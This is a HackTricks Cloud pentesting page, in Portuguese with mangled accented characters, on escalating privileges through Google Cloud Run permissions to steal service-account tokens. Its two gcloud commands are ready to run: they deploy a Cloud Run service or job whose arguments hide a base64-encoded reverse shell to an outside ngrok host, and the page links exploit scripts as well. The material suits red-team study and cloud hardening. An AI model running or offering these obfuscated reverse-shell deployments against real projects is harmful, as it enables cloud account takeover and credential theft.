# GCP - Run Privesc

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Cloud Run

Para mais informa√ß√µes sobre Cloud Run, consulte:

{% content-ref url="../../gcp-pentesting/gcp-services/gcp-cloud-run-enum.md" %}
[gcp-cloud-run-enum.md](../../gcp-pentesting/gcp-services/gcp-cloud-run-enum.md)
{% endcontent-ref %}

### `run.services.create` , `iam.serviceAccounts.actAs`

Semelhante ao m√©todo _cloudfunctions.functions.create_, este m√©todo cria um **novo Servi√ßo Cloud Run** que, quando invocado, **retorna o token de acesso da Conta de Servi√ßo** acessando a API de metadados do servidor em que est√° executando. Um servi√ßo Cloud Run ser√° implantado e uma solicita√ß√£o pode ser feita a ele para obter o token.

Voc√™ tamb√©m pode precisar das permiss√µes **`run.services.setIamPolicy`** ou **`run.routes.invoke`** se n√£o puder cri√°-lo publicamente acess√≠vel para ser invocado por qualquer pessoa que acesse a URL (isso pode ser impedido por Pol√≠ticas de Organiza√ß√£o).

![](https://rhinosecuritylabs.com/wp-content/uploads/2020/04/image8-1000x503.png)

Este m√©todo usa uma imagem Docker inclu√≠da que deve ser constru√≠da e hospedada para ser explorada corretamente. A imagem √© projetada para instruir o Cloud Run a responder com o token de acesso da Conta de Servi√ßo quando uma solicita√ß√£o HTTP √© feita.

O script de explora√ß√£o para este m√©todo pode ser encontrado [aqui](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/run.services.create.py) e a imagem Docker pode ser encontrada [aqui](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudRunDockerImage).

Por algum motivo, ao usar `gcloud run deploy` em vez de apenas criar o servi√ßo **√© necess√°ria a permiss√£o de atualiza√ß√£o**. Confira um [**exemplo aqui**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/o-run.services.create.sh).

### `run.services.update` , `iam.serviceAccounts.actAs`

Como o anterior, mas atualizando um servi√ßo
```bash
gcloud run deploy hacked \
--image=marketplace.gcr.io/google/ubuntu2004 \
--command=bash \
--args="-c,echo c2ggLWkgPiYgL2Rldi90Y3AvNy50Y3AuZXUubmdyb2suaW8vMTQ4NDEgMD4mMQ== | base64 -d | bash" \
--service-account="<proj-num>-compute@developer.gserviceaccount.com" \
--region=us-central1 \
--allow-unauthenticated
```
### `run.services.setIamPolicy`

Conceda a si mesmo permiss√µes anteriores sobre o Cloud Run.

### `run.jobs.create`, `run.jobs.run`, (`run.jobs.get`)

Lance um trabalho com um shell reverso para roubar a conta de servi√ßo indicada no comando. Voc√™ pode encontrar um [**exploit aqui**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/m-run.jobs.create.sh).

### `run.jobs.update`, `run.jobs.run`, `iam.serviceaccounts.actAs`, (`run.jobs.get`)

Semelhante ao anterior, √© poss√≠vel **atualizar um trabalho e atualizar a SA**, o **comando** e **execut√°-lo**:
```bash
gcloud beta run jobs update hacked \
--image=marketplace.gcr.io/google/ubuntu2004 \
--command=bash \
--args="-c,echo c2ggLWkgPiYgL2Rldi90Y3AvNy50Y3AuZXUubmdyb2suaW8vMTQ4NDEgMD4mMQ== | base64 -d | bash" \
--service-account=<proj-num>-compute@developer.gserviceaccount.com \
--region=us-central1 \
--project=security-devbox --execute-now
```
### `run.jobs.setIamPolicy`

Conceda a si mesmo as permiss√µes anteriores sobre Cloud Jobs.

## Refer√™ncias

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

<details>

<summary><strong>Aprenda hacking em AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
